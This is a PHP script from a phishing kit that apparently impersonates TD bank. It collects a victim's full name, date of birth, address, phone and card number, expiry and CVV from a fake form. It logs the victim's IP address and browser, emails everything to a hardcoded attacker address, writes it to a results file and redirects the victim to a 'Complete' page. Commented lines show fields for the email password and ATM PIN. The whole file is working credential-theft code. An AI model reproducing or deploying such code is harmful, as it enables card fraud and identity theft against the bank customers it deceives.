<?php

include("blocker.php");

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message = "";
$message .= "-----------------3 PersonalDetails----------------\n";
$message .= "FULLNAME	: ".$_POST['FN']."\n";
$message .= "DOB		: ".$_POST['DB']."\n";
//$message .= "MMN		: ".$_POST['MN']."\n";
$message .= "ADDRESS		: ".$_POST['SN']."\n";
$message .= "PHONE		: ".$_POST['DN']."\n";
// $message .= "EMAIL		: ".$_POST['EA']."\n";
// $message .= "PASS		: ".$_POST['EP']."\n";
$message .= "-----------------4 CardDetails--------------------\n";
//$message .= "NAMEONCARD	: ".$_POST['NC']."\n";
$message .= "CARDNO		: ".$_POST['CN']."\n";
$message .= "EXP		: ".$_POST['ED']."\n";
$message .= "CVV		: ".$_POST['CV']."\n";
//$message .= "ATMPIN		: ".$_POST['AP']."\n";
$message .= "-----------------created by medpage---------------\n";
$message .= "IP          : ".$ip."\n";
$message .= "BROWSER     : ".$browser."\n";
$message .= "-----------------TD Results-----------------------\n";
$send = "rikkogreen44@protonmail.com";
$subject = "TD Resultz 2 ";

@mail($send,$subject,$message);

$fp = fopen('results.txt', 'a');
fwrite($fp, $message);
fclose($fp);
?>
<script>
    window.top.location.href = "Complete.php";

</script>